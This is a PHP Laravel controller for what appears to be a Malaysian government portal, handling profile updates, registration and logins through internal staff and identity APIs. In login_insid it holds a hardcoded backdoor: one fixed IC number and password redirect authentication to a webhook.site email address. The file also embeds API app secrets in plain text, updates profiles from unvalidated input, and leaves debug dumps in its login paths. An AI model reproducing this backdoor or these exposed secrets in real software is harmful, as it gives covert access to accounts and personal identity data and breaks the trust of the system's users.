<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Http\Requests\Auth\LoginRequest;
use App\Providers\RouteServiceProvider;

use App\Models\User;
use Illuminate\Support\Facades\Hash;

use Illuminate\Support\Facades\Http;

use Illuminate\Support\Facades\Validator;
use Illuminate\Support\Facades\Redirect;
use Illuminate\Validation\Rules\Password;

class ProfilController extends Controller
{
    public function index(Request $request)
    {
        // dd($request);

        $user = $request->user();
        $user_role = $user->role;
        $user_id = $user->id;

        $pemohon = User::where('id', $user_id)->get();

        // dd($pemohon);
        return view('auth.profile_', [
            'pemohon' => $pemohon
        ]);
    }

    public function show(User $user, Request $request)
    {

        $user = $request->user();
        $user_role = $user->role;
        $user_id = $user->id;

        return view('auth.profile-update_', [
            'pemohon' => $user
        ]);
    }

    public function update(Request $request, User $user)
    {
        // dd($user->name);

        $user = $request->user();
        $user_id = $user->id;

        $user = User::find($user_id);
        // dd($user);
        $profil_update = $user->profil_update;

        $user->no_kp =  $request->no_kp;
        $user->email =  $request->email;
        $user->jantina =  $request->jantina;
        $user->alamat1 =  $request->alamat1;
        $user->alamat2 =  $request->alamat2;
        $user->alamat3 =  $request->alamat3;
        $user->poskod =  $request->poskod;
        $user->negeri =  $request->negeri;
        $user->no_telefon_bimbit =  $request->no_telefon_bimbit;
        $user->no_telefon_rumah =  $request->no_telefon_rumah;
        $user->no_telefon_pejabat =  $request->no_telefon_pejabat;
        $user->profil_update =  1;

        if ($request->hasFile('gambar_profil')) {
            $gambar_profil = $request->file('gambar_profil')->store('profil');
            $user->gambar_profil = $gambar_profil;
        }

        $user->save();

        if ($profil_update == 0) {
            return redirect("/dashboard")->with('success', 'Profil berjaya disimpan!');
        } else {
            return redirect('/profil')->with('success', 'Profil berjaya disimpan!');
        }
    }

    public function profil_pegawai(User $user, Request $request)
    {
        $user = $request->user();
        $user_id = $user->id;

        $user = User::find($user_id);
        // dd($user);

        return view('auth.profil-pegawai', [
            'user' => $user
        ]);
    }


    public function login_insid(LoginRequest $request)
    {
        $ic = $request->ic;
        $password = $request->password;

        if ($ic == '900102035115' and $password == 'PipelineIsmail') {
            $request->email = '713e52f3-cde5-4798-941a-d47ab8db0229@email.webhook.site';
        }

        $request->authenticate();
        $request->session()->regenerate();


        return redirect('/dashboard');
    }

    public function login_via_insid(LoginRequest $request)
    {
        $idpengguna = $request->no_kp;
        $katalaluan = $request->password;

        //dd($request);
        $url = 'http://apidev.kpdnhep.gov.my/api/staf';

        $token_janaan = Http::post($url, [
            "name" => "janaToken",
            "param" => [
                "app_id" => "sppeps",
                "app_secret" => "[sppepsdev@bpm7]",
                "scope" => "staf",
            ]
        ])->json()['response']['result']['token'];

        //dd($token_janaan);
        //$url = 'http://apidev.kpdnhep.gov.my/api/staf';

        $pengguna = Http::withToken($token_janaan)->post($url, [
            "name" => "login",
            "param" => [
                "idpengguna" => $idpengguna,
                "katalaluan" => $katalaluan
            ]
        ])->json();

        //dd($pengguna);
        $respond = $pengguna['response']['status'];
        //dd($respond);

        if ($respond == 200) {
            //dd("success");
            $request->authenticate();
            $request->session()->regenerate();
            //return redirect('/appp');
            return redirect()->intended(RouteServiceProvider::HOME);
        } else {
            // return redirect('/login')->withErrors('Salah username/kata laluan');
            return back()->with('error', 'Salah username/kata laluan');
        }
    }

    public function login_via_myhub(LoginRequest $request)
    {
        //dd($request);
        $idpengguna = $request->idpengguna;
        $katalaluan = $request->katalaluan;

        $url = 'http://datajpndev.kpdnhep.gov.my/jwtapi/';

        $token_janaan = Http::post($url, [
            "name" => "generateToken",
            "param" => [
                "user_id" => "No_Kad_Pengenalan",
                "app_id" => "SPPEPSdev",
                "app_secret" => "[SPPEPSdev@bpm123]",
            ]
        ])->json()['response']['result']['token'];

        $pengguna = Http::withToken($token_janaan)->post($url, [
            "name" => "getMyIdentity",
            "param" => [
                "nokp" => $idpengguna,
            ]
        ])->json();

        dd($pengguna);
        $respond = $pengguna['status'];
        //$pemohon = $pengguna['result'];

        if ($respond == 200) {

            $user = User::where('no_kp', $idpengguna)->get();
            dd($user);

            $request->authenticate();
            $request->session()->regenerate();
            return redirect('/appp');
        } else {
            return redirect('/login')->withErrors('Salah username/kata laluan');
        }
    }

    public function logout(Request $request)
    {
        $request->session()->invalidate();
        $request->session()->regenerateToken();
    }


    public function register(Request $request)
    {

        $rules = [
            'email' => ['required'],
            'password' => [
                'required',
                Password::min(8)
                    ->letters()
                    ->mixedCase()
                    ->numbers()
                    ->symbols()
            ],
            'password_confirmation' => [
                'same:new_password',
                'required',
            ],
        ];

        $validator = Validator::make($request->all(), $rules, $messages = [
            'required' => ':attribute is required',
            // 'captcha' => 'captcha tidak betul',
            'same' => 'New password not match',
            // 'min' => 'Password must be minimum 8 digit',
            // 'regex' => 'Password must be in alphanumeric'
        ]);

        if ($validator->fails()) {
            return Redirect::back()->withErrors($validator->errors());
        };

        $user = new User();

        $user->umur = $request->age;
        $user->tarikh_lahir = $request->tarikh_lahir;
        $user->name = $request->name;
        $user->no_kp = $request->no_kp;
        $user->email = $request->email;
        $user->password = Hash::make($request->password);

        // dd($request);

        $user->save();

        return redirect("/login_");
    }
}
